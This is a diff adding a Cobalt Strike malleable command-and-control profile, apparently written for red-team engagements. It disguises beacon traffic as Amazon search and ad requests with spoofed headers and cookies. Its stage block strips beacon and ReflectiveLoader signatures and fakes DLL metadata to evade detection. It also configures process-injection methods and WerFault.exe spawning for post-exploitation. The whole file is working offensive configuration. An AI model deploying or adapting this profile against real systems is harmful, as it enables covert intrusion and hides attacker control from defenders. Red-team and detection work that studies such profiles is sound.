@@ -1,0 +1,194 @@
+#################################
+#                               #
+#   Author:     Justin Lucas    #
+#   Company:    Ingressive      #
+#   Credit:     kphongag        #
+#   Date:       May 24, 2021    #
+#                               #
+#################################
+
+#################################
+#                               #
+#   DO NOT USE STAGED PAYLOADS  #
+#             EVER              #
+#                               #
+#################################
+
+set sleeptime "8000";
+set jitter    "25";
+set maxdns    "255";
+set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+set pipename "chromium_###";
+set ssh_banner "OpenSSH v8.1";
+set tcp_port "8081";
+set host_stage "false";
+
+http-get {
+
+    set uri "/s/ref=nb_sb_noss_1/122-3223588-02007569/field-keywords=books";
+
+    client {
+
+        header "Accept" "*/*";
+        header "Host" "www.amazon.com";
+
+        metadata {
+            base64;
+            prepend "session-token=";
+            prepend "skin=noskin;";
+            append "csm-hit=s-24KU11BB22RZSAED3BPL|1419835412978";
+            header "Cookie";
+        }
+    }
+
+    server {
+
+        header "Server" "Server";
+        header "x-amz-id-1" "LLKUYEZKCBVEW5Z41PZT";
+        header "x-amz-id-2" "a11yZ2xwMMMtdGRsa555bGV3YW85lkZuZW9ydG5rXcFdZ2tmZGl6aOLvJJKpogo=";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Content-Encoding" "gzip";
+
+        output {
+            print;
+        }
+    }
+}
+
+http-post {
+
+    set uri "/N4215/avp/amzn.us.sr.aps";
+
+    client {
+
+        header "Accept" "*/*";
+        header "Content-Type" "text/xml";
+        header "X-Requested-With" "XMLHttpRequest";
+        header "Host" "www.amazon.com";
+
+        parameter "sz" "180x680";
+        parameter "oe" "oe=ISO-3312-2;";
+
+        id {
+            parameter "sn";
+        }
+
+        parameter "s" "3998";
+        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";
+
+        output {
+            base64;
+            print;
+        }
+    }
+
+    server {
+
+        header "Server" "Server";
+        header "x-amz-id-1" "LLKUYEZKCBVEW5Z41PZT";
+        header "x-amz-id-2" "a11yZ2xwMMMtdGRsa555bGV3YW85lkZuZW9ydG5rXcFdZ2tmZGl6aOLvJJKpogo=";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "x-ua-compatible" "IE=edge";
+
+        output {
+            prepend "....----.........----.........----.........----.........----.........----.....";
+            append "--____---___---___....----.........----.........----.........----.........----.....";
+            base64url;
+            base64url;
+            print;
+        }
+    }
+}
+
+http-stager {
+
+    client {
+        header "Host" "www.amazon.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US,en;q=0.5";
+        header "Accept-Encoding" "gzip, deflate";
+    }
+
+    server {
+        header "Cache-Control" "private, max-age=3600";
+        header "Content-Type" "application/json; charset=UTF-8";
+        header "Server" "aws";
+        header "Connection" "close";
+    }
+}
+
+stage {
+    set checksum       "0";
+    set compile_time   "21 Apr 2021 13:10:50";
+    set entry_point    "8800";
+    set name           "CSCOMUtils.dll";
+    set rich_header    "\xbd\xa1\x57\x94\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\x9c\xa6\x3a\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3c\xc6\x7a\xc0\x39\xc7\xab\xa8\x3a\xc6\xf1\xc0\x39\xc7\xab\xa8\x3c\xc6\xd8\xc0\x39\xc7\xab\xa8\x3d\xc6\xf7\xc0\x39\xc7\x95\xa8\x30\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3d\xc6\xf4\xc0\x39\xc7\x9c\xa6\x38\xc6\xf0\xc0\x39\xc7\xf9\xc0\x38\xc7\x97\xc0\x39\xc7\x95\xa8\x39\xc6\xf8\xc0\x39\xc7\x95\xa8\xc6\xc7\xf8\xc0\x39\xc7\x95\xa8\x3b\xc6\xf8\xc0\x39\xc7\x52\x69\x63\x68\xf9\xc0\x39\xc7\x00\x00\x00\x00\x00\x00\x00\x00";
+
+    set userwx "false";
+    set obfuscate "true";
+    set cleanup "true";
+    set sleep_mask "true";
+
+    set module_x64 "netshell.dll";
+    set module_x86 "netshell.dll";
+
+    transform-x86 {
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+        strrep "ReflectiveLoader" "ama";
+        strrep "This program cannot be run in DOS mode" "";
+        strrep "beacon.dll" "";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+
+    transform-x64 {
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+        strrep "ReflectiveLoader" "ama";
+        strrep "This program cannot be run in DOS mode" "";
+        strrep "beacon.x64x.dll" "";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+}
+
+process-inject {
+    set allocator "NtMapViewOfSection";
+
+    set min_alloc "16384";
+    set userwx    "false";
+    set startrwx  "false";
+
+    transform-x86 {
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+
+    transform-x64 {
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        SetThreadContext;
+        NtQueueApcThread-s;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
+}
+
+post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
+    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
+
+    set obfuscate "true";
+    set smartinject "true";
+    set amsi_disable "false";
+    set pipename "chromium_####, win\\msrpc_####";
+}
+
+
+https-certificate {
+    set keystore "{{ provided_domain }}.pkcs12";
+    set password "{{ provided_password }}";
+}
